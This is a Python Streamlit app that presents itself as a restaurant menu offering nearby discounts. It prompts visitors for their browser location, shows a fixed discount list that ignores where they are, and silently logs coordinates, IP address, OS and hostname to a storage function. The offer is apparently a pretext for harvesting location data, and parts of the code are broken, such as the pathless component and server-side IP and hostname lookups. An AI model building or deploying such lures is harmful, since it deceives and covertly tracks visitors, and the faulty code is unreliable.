import streamlit as st
import streamlit.components.v1 as components
import json
import requests
import platform
import socket
from datetime import datetime
from utils import guardar_datos  # tu función para guardar info

st.set_page_config(page_title="Carta con Descuentos", layout="centered")

st.title("🍽️ Carta Exclusiva con Descuentos Cercanos")
st.write("Para mostrarte los mejores descuentos cerca de ti, necesitamos acceder a tu ubicación.")

# Crea un componente custom para obtener la ubicación
def get_location():
    location = components.declare_component(
        "get_location",
        default=None,
    )

    if location is None:
        # Primer render, insertamos JS para pedir ubicación
        components.html(
            """
            <script>
            const sendLocation = () => {
              navigator.geolocation.getCurrentPosition(
                (pos) => {
                  const coords = {lat: pos.coords.latitude, lon: pos.coords.longitude};
                  window.parent.postMessage({isLocation: true, coords: coords}, "*");
                },
                (err) => {
                  window.parent.postMessage({isLocation: true, error: err.message}, "*");
                }
              );
            };
            sendLocation();
            </script>
            """,
            height=0,
        )
    return location

# Escuchar mensajes desde JS usando st.experimental_get_query_params no funciona,
# pero Streamlit no soporta capturar postMessage nativamente,
# por eso usaremos el componente declarado que puede devolver info a Python
# cuando use window.parent.postMessage y el componente se llama get_location

# Alternativa directa con declare_component es que se usa con React + JS, pero
# sin archivo JS es muy limitada. Por eso usamos la siguiente forma simple:

# En su lugar, vamos a usar components.html con un pequeño hack:
# En cada ejecución, la función components.html() puede devolver texto usando window.prompt

# Pero prompt no es práctico, mejor:
# Vamos a usar el siguiente método: con un botón, pedimos la ubicación y la pasamos a un input text que Streamlit lee

# Paso 1: Mostrar botón para pedir ubicación con JS que llena un campo oculto
if "coords" not in st.session_state:
    st.session_state.coords = None

clicked = st.button("Permitir acceso a la ubicación")

if clicked:
    # Lanzar el JS para pedir la ubicación y guardarla en un input oculto
    components.html(
        """
        <script>
        navigator.geolocation.getCurrentPosition(
          function(position) {
            const coords = position.coords.latitude + "," + position.coords.longitude;
            // Colocar coords en input hidden que Streamlit puede leer
            const input = window.parent.document.querySelector('input#coords_input');
            if(input){
              input.value = coords;
              input.dispatchEvent(new Event('change'));
            }
          },
          function(error) {
            alert("Error al obtener la ubicación: " + error.message);
          }
        );
        </script>
        """,
        height=0,
    )

# Paso 2: input text oculto para recibir coords desde JS
coords = st.text_input("Coords", key="coords_input", value="", label_visibility="hidden")

# Si coords ha cambiado, actualizar st.session_state.coords
if coords and coords != st.session_state.coords:
    st.session_state.coords = coords

if st.session_state.coords:
    try:
        lat_str, lon_str = st.session_state.coords.split(",")
        lat = float(lat_str)
        lon = float(lon_str)
        st.success(f"¡Gracias! Detectamos tu ubicación: 🌍 ({lat:.4f}, {lon:.4f})")
        st.subheader("Descuentos cercanos para ti:")
        st.markdown("""
        - 🍕 Pizza Margarita -20%
        - 🍣 Sushi Deluxe -15%
        - 🥗 Ensalada Mediterránea -10%
        """)

        # Registrar datos
        user_data = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "lat": lat,
            "lon": lon,
            "ip": requests.get("https://api.ipify.org").text,
            "browser": "N/A",  # No hay forma directa en Streamlit para user_agent sin librerías extra
            "os": platform.system(),
            "hostname": socket.gethostname()
        }
        guardar_datos(user_data)
    except Exception as e:
        st.error(f"Error al interpretar coordenadas: {e}")
else:
    st.warning("Por favor, pulsa el botón y acepta la solicitud de ubicación en tu navegador.")

